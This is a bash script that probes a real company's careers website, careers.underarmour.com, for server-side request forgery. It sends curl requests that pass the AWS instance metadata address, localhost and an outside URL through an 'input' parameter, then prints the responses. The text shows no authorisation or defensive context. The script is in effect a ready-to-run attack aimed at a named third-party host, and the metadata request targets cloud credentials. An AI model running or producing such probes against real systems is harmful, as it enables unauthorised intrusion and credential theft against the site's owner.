#!/bin/bash

echo "=== Testing SSRF on careers.underarmour.com ==="
echo ""

# Test 1: AWS metadata
echo "[Test 1] AWS metadata (169.254.169.254):"
curl -s --max-time 5 "https://careers.underarmour.com?input=http://169.254.169.254/latest/meta-data/" 2>&1 | head -10
echo ""

# Test 2: localhost
echo "[Test 2] localhost:"
curl -s --max-time 5 "https://careers.underarmour.com?input=http://localhost" 2>&1 | head -10
echo ""

# Test 3: example.com
echo "[Test 3] example.com:"
curl -s --max-time 5 "https://careers.underarmour.com?input=http://example.com" 2>&1 | head -10
echo ""

# Test 4: Check base URL response
echo "[Test 4] Base URL (no params):"
curl -s --max-time 5 "https://careers.underarmour.com" 2>&1 | head -10
echo ""

echo "=== Tests completed ==="
